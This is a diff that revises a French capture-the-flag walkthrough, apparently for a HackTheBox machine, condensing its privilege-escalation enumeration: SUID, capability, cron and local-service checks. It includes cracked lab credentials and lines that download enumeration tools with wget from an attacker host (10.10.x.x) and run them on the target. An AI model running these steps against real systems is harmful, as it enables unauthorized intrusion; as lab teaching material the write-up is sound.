@@ -987,7 +987,7 @@ Tu utilises ensuite un service de crack comme CrackStation pour retrouver le mot
 Le hash est résolu en :
 
 ```text
-gael : mattp005numbertwo
+gael:mattp005numbertwo
 ```
 
 #### Accès SSH
@@ -1312,166 +1312,53 @@ Tu obtiens ainsi les identifiants suivants :
 backrest_root:!@#$%^
 ```
 
-### Recherche de binaires SUID
+Ces identifiants correspondent probablement à un compte applicatif.
+ Un test en SSH confirme qu’ils ne permettent pas un accès système.
 
-Tu poursuis l’énumération en recherchant les **binaires SUID**, qui permettent parfois d’exécuter certaines commandes avec les privilèges de leur propriétaire.
+Tu conserves ces informations et poursuis l’énumération afin d’identifier un service associé.
+
+### Recherche de binaires SUID
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-La liste obtenue ne contient que des binaires système classiques tels que :
-
-```bash
-/usr/bin/gpasswd
-/usr/bin/chfn
-/usr/bin/newgrp
-/usr/bin/fusermount
-/usr/bin/chsh
-/usr/bin/mount
-/usr/bin/sudo
-/usr/bin/su
-/usr/bin/passwd
-/usr/bin/at
-/usr/bin/umount
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/policykit-1/polkit-agent-helper-1
-/usr/lib/eject/dmcrypt-get-device
-/usr/lib/openssh/ssh-keysign
-...
-```
-
-Ces binaires sont classiques sur un système Linux et sont généralement présents par défaut.
-
-Tu n’identifies aucun binaire inhabituel ou directement exploitable.
+Aucun binaire inhabituel ou exploitable n’est identifié.
 
 ### Analyse des Linux capabilities
 
-Tu vérifies ensuite si certains binaires disposent de **capabilities Linux**, qui permettent à un programme d’effectuer certaines actions privilégiées sans être exécuté en root ou via un binaire SUID.
-
-La vérification se fait avec la commande suivante :
-
 ```bash
 getcap -r / 2>/dev/null
-
-/usr/bin/ping = cap_net_raw+ep
-/usr/bin/traceroute6.iputils = cap_net_raw+ep
-/usr/bin/mtr-packet = cap_net_raw+ep
-/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 ```
 
-Ici, tu ne trouves aucune capability inhabituelle ni aucun binaire exploitable.
+Aucune capability exploitable n’est trouvée.
 
 ### Vérification des SUID avec suid3num.py
-
-Pour compléter l’analyse des binaires SUID, tu utilises l’outil suid3num.py, qui permet d’identifier rapidement :
-
-les binaires SUID intéressants
-leur présence éventuelle dans GTFOBins
-
-Tu le télécharges et l’exécutes depuis un répertoire en mémoire (/dev/shm) :
 
 ```bash
 cd /dev/shm
 wget http://10.10.x.x:8000/suid3num.py
 python3 suid3num.py
 ```
-```bash
-  ___ _   _ _ ___    _____  _ _   _ __  __ 
- / __| | | / |   \  |__ / \| | | | |  \/  |
- \__ \ |_| | | |) |  |_ \ .` | |_| | |\/| |
- |___/\___/|_|___/  |___/_|\_|\___/|_|  |_|  twitter@syed__umar
-
-[#] Finding/Listing all SUID Binaries ..
-------------------------------
-/usr/bin/gpasswd
-/usr/bin/chfn
-/usr/bin/newgrp
-/usr/bin/fusermount
-/usr/bin/chsh
-/usr/bin/mount
-/usr/bin/sudo
-/usr/bin/su
-/usr/bin/passwd
-/usr/bin/at
-/usr/bin/umount
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/policykit-1/polkit-agent-helper-1
-/usr/lib/eject/dmcrypt-get-device
-/usr/lib/openssh/ssh-keysign
-------------------------------
-
-
-[!] Default Binaries (Don't bother)
-------------------------------
-/usr/bin/gpasswd
-/usr/bin/chfn
-/usr/bin/newgrp
-/usr/bin/fusermount
-/usr/bin/chsh
-/usr/bin/mount
-/usr/bin/sudo
-/usr/bin/su
-/usr/bin/passwd
-/usr/bin/at
-/usr/bin/umount
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/policykit-1/polkit-agent-helper-1
-/usr/lib/eject/dmcrypt-get-device
-/usr/lib/openssh/ssh-keysign
-------------------------------
-
-
-[~] Custom SUID Binaries (Interesting Stuff)
-------------------------------
-------------------------------
-
-
-[#] SUID Binaries found in GTFO bins..
-------------------------------
-[!] None :(
-------------------------------
-
-
-
-```
-
-L’outil confirme que :
-
-- tous les binaires SUID présents sont standards
 - aucun binaire personnalisé n’est identifié
 - aucun binaire exploitable via GTFOBins n’est détecté
-  
-
-Cette vérification confirme que la piste des SUID ne mène à rien dans ce cas précis.
 
 ### Inspection des tâches cron
-Tu vérifies ensuite les **tâches planifiées (cron)**, car certains scripts exécutés automatiquement par le système peuvent être modifiables par un utilisateur et permettre une élévation de privilèges.
-
-Les crons système peuvent être consultés avec :
-
 ```bash
 cat /etc/crontab
 ```
 
-```bash
-17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
-25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
-47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
-52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
-```
+Seules les tâches système par défaut sont présentes.
 
+### pspy64
 
+Tu observes les processus exécutés par root avec pspy64.
 
-Tu n’identifies ici aucune tâche personnalisée, aucun script spécifique à l’application, ni aucune commande directement exploitable.
-
-La piste des tâches cron système ne donne donc rien à ce stade.
+Aucun processus exploitable n’apparaît, même après plusieurs minutes d’observation.
 
 ### Analyse des services locaux
 
-Tu vérifies ensuite les **services en cours d’exécution**, ce qui permet parfois d’identifier une application vulnérable ou un service mal configuré.
-
-```
+```bash
 netstat -tulpn
 ```
 
@@ -1483,32 +1370,32 @@ tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
 tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
 ```
 
+Tu recherches les services associés aux ports **5000** et **9898** depuis le répertoire `/etc` :
 
+```bash
+grep -r ':9898' /etc 2>/dev/null
+grep -r ':5000' /etc 2>/dev/null
+```
 
+Résultats :
 
+```bash
+systemd/system/backrest.service:Environment="BACKREST_PORT=127.0.0.1:9898"
+systemd/system/app.service:ExecStart=/usr/bin/gunicorn -w 4 --error-logfile /dev/null --access-logfile /dev/null app:app -b 127.0.0.1:5000
+/etc/nginx/sites-available/default:		proxy_pass http://127.0.0.1:5000;
+gael@artificial:/$ 
+```
 
-### pspy64
+Ces recherches permettent d’identifier que :
 
-Tu lances également pspy64 dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root.
-
-Tu le télécharges et l’exécutes depuis un répertoire persistant (/var/tmp) :
-
-cd /var/tmp
-wget http://10.10.x.x:8000/pspy64
-chmod +x pspy64
-./pspy64
-
-L’objectif est d’identifier des tâches exécutées automatiquement par root pouvant être exploitables.
-
-Dans ce cas précis, aucun processus exploitable n’apparaît dans cette deuxième session, même en redémarrant la première session SSH.
+- **Backrest** est exécuté localement sur le port **9898**
+- **nginx** relaie les requêtes vers l’application sur le port **5000**
 
 ### Conclusion de l’énumération manuelle
 
-### Analyse avec linpeas.sh
-Dans **LinPEAS**, les vulnérabilités potentielles sont classées et surlignées par couleur.
-![Légende des couleurs de LinPEAS indiquant le niveau de criticité des vulnérabilités](/images/linpeas-legend.png)
+Les vérifications classiques (sudo, SUID, capabilities, suid3num, cron, pspy64) ne révèlent aucune piste exploitable.
 
----
+En revanche, l’accès à une sauvegarde via le groupe `sysadm` t’a permis de récupérer des identifiants pour **Backrest**, et l’analyse des fichiers de configuration a révélé que ce service est exécuté localement sur le port **9898**.
 
 ## Conclusion
 
